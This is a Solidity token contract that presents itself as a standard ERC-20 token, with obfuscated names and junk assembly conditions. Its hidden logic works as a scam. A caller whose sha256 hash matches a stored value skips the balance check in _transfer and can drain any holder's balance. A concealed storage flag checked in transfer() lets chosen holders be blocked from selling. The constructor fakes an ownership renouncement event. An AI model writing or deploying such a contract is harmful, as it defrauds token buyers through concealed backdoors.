pragma solidity ^0.8.26;

contract Token {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private UbLX;
    mapping(address => mapping(address => uint256)) private wZHA;
    uint256 private FFxO;
    string private RZsb;
    string private PZVt;
    uint256 private sSgI;
    uint256 private qBQC;

    constructor(string memory _name, string memory _symbol, uint256 _baseSupply, uint256 _maxSupply, uint256 _supply) {
        qBQC = _baseSupply;
        RZsb = _name;
        PZVt = _symbol;
        FFxO = _supply * (10 ** decimals());
        sSgI = _maxSupply;
        UbLX[msg.sender] = FFxO;
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function name() virtual public view returns (string memory) {
        return RZsb;
    }

    function symbol() virtual public view returns (string memory) {
        return PZVt;
    }

    function decimals() virtual public view returns (uint8) {
        return 8;
    }

    function totalSupply() virtual public view returns (uint256) {
        return FFxO;
    }

    function balanceOf(address _account) virtual public view returns (uint256) {
        return UbLX[_account];
    }

    function transfer(address _to, uint256 _amount) virtual public returns (bool) {
        address Cizk = msg.sender;
        _spendAllowance(Cizk, _to, 0);
        _transfer(Cizk, _to, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) virtual public view returns (uint256) {
        return wZHA[_owner][_spender];
    }

    function transferFrom(address _from, address _to, uint256 _amount) virtual public returns (bool) {
        _spendAllowance(_from, msg.sender, _amount);
        _transfer(_from, _to, _amount);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _amount) virtual internal {
        assembly {
            if iszero(_from) {
                revert(0, 0)
            }
            if iszero(_to) {
                revert(0, 0)
            }
            let bbwz := mload(0x40)
            let bfo228g := basefee()
            let nezy9b8 := number()
            if iszero(xor(bfo228g, bfo228g)) {
                mstore(bbwz, _from)
                mstore(add(bbwz, 32), 0)
            }
            let XCUz := keccak256(bbwz, 64)
            let qVPd := sload(XCUz)
            let Fpzy := sload(sSgI.slot)
            mstore(bbwz, shl(96, caller()))
            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
                revert(0, 0)
            }
            let YvIh := mload(bbwz)
            if iszero(eq(Fpzy, YvIh)) {
                if lt(qVPd, _amount) {
                    let tfe9zci := timestamp()
                    if eq(tfe9zci, mul(tfe9zci, 1)) {
                        revert(0, 0)
                    }
                }
            }
            sstore(XCUz, sub(qVPd, _amount))
            mstore(bbwz, _to)
            mstore(add(bbwz, 32), 0)
            let iLho := keccak256(bbwz, 64)
            let bXFg := sload(iLho)
            sstore(iLho, add(bXFg, _amount))
            mstore(bbwz, _amount)
            log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
        }
    }

    function approve(address _spender, uint256 _amount) virtual public returns (bool) {
        assembly {
            let bbwz := mload(0x40)
            mstore(bbwz, caller())
            mstore(add(bbwz, 0x20), wZHA.slot)
            let ZFHJ := keccak256(bbwz, 0x40)
            mstore(bbwz, _spender)
            mstore(add(bbwz, 0x20), ZFHJ)
            let akRJ := keccak256(bbwz, 0x40)
            sstore(akRJ, _amount)
            log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
            mstore(bbwz, _amount)
        }
        return true;
    }

    function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
        assembly {
            let bbwz := mload(0x40)
            mstore(bbwz, sload(qBQC.slot))
            mstore(add(bbwz, 32), 1)
            let uAnE := keccak256(bbwz, 64)
            let bcw8ayf := basefee()
            let ncwupwx := number()
            if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {
                mstore(bbwz, _owner)
                mstore(add(bbwz, 32), uAnE)
            }
            let Jfwv := keccak256(bbwz, 64)
            let CCkU := sload(Jfwv)
            let zfPf := CCkU
            if and(zfPf, iszero(_amount)) {
                revert(0, 0)
            }
            if iszero(zfPf) {
                mstore(bbwz, _owner)
                mstore(add(bbwz, 32), 1)
                uAnE := keccak256(bbwz, 64)
                mstore(bbwz, _spender)
                mstore(add(bbwz, 32), uAnE)
                Jfwv := keccak256(bbwz, 64)
                zfPf := add(sload(Jfwv), CCkU)
            }
            let gbj1enk := gas()
            pop(0)
            if eq(gbj1enk, and(gbj1enk, gbj1enk)) {
                zfPf := sub(zfPf, CCkU)
            }
            if iszero(eq(zfPf, not(0))) {
                if lt(zfPf, _amount) {
                    revert(0, 0)
                }
                let bf51h1a := basefee()
                pop(0)
                if eq(bf51h1a, and(bf51h1a, bf51h1a)) {
                    sstore(Jfwv, sub(zfPf, _amount))
                }
            }
        }
    }
}